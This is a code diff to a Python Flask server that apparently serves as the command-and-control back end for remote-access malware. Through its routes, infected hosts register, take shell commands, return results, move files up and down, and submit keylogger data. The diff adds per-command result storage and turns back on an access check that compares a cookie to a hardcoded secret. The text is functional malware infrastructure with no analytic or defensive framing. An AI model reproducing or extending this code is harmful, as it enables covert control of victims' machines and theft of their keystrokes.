@@ -62,7 +62,10 @@ def displayHosts():
 def handshake():
   global hosts
   key = (request.remote_addr, request.form['name'])
-  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : [''], 'command_result' : ''}
+  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : [''], 
+                'command_result' : {'command' : '', 
+                                    'upload' : '',
+                                    'download' : ''}}
   hosts[key]['lock'].acquire()
   return 'Request accepted', 200
 
@@ -138,9 +141,9 @@ def shell():
 @app.route('/result', methods = ['POST'])
 def result():
   global hosts
-  
+  id = request.form['command_id']
   key = (request.remote_addr, request.form['name'])
-  hosts[key]['command_result'] = request.form['result']
+  hosts[key]['command_result'][id] = request.form['result']
 
   return 'Ok', 200
 
@@ -148,10 +151,11 @@ def result():
 @app.route('/getResult', methods = ['POST'])
 def get_result():
   global hosts
+  id = request.args.get('id')
   name = request.form['name']
   ip = request.form['ip']
   key = (ip, name)
-  return hosts[key]['command_result']
+  return hosts[key]['command_result'][id]
 
 # this is where the host can send it's keylog data
 @app.route('/log', methods = ['POST'])
@@ -198,8 +202,8 @@ def getLog():
 @app.route('/download', methods = ['POST', 'GET'])
 def download():
   if request.method == 'GET':
-    # if request.cookies.get('superSecretKey') != 'c457r4v371':
-      # return render_template('notLoggedIn.html')
+    if request.cookies.get('superSecretKey') != 'c457r4v371':
+      return render_template('notLoggedIn.html')
     name = request.args.get('name')
     ip = request.args.get('ip')
     return render_template('download.html', name = name, ip = ip)
